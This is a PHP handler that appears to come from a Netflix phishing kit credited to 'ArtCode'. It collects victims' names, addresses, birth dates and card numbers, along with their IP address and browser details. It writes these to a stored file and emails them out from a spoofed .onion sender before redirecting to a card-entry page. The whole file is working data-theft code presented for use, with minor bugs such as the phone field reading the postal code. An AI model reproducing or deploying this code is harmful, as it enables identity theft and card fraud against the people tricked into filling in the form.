<?php
$ip = getenv("REMOTE_ADDR");
include '../options/get_browser.php';
include '../settings/email.php';
$message .= "====================<[ Netflix Login ]>====================\n";
$message .= "# First Name          : ".$_POST['firstname']."\n";
$message .= "# Last Name           : ".$_POST['lastname']."\n";
$message .= "# Address Line        : ".$_POST['address']."\n";
$message .= "# City                : ".$_POST['city']."\n";
$message .= "# State               : ".$_POST['state']."\n";
$message .= "# Postal Code         : ".$_POST['zip']."\n";
$message .= "# Phone Number        : ".$_POST['zip']."\n";
$message .= "# Birth Date          : ".$_POST['birth']."\n";
$message .= "====================<[ Personal Information ]>====================\n";
$message .= "# IP Address          : ".$ip."\n";
$message .= "# Browser             : ".$browser."\n";
$message .= "# System              : ".$os."\n";
$message .= "# User Agnet          : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "====================<[ Thanks by ArtCode ]>====================\n";
$cc = $_POST['ccn'];
$subject = "🖤 Netflix Billing Information: [ $os - $browser - $ip ] ";
$headers = 'From: Martin <newlog@martin-flix.onion>' . "\r\n" .
$file = fopen("../stored.txt", 'a');
fwrite($file, $message);
mail($send,$subject,$message,$headers);

header("Location: ../ref-card.php");?>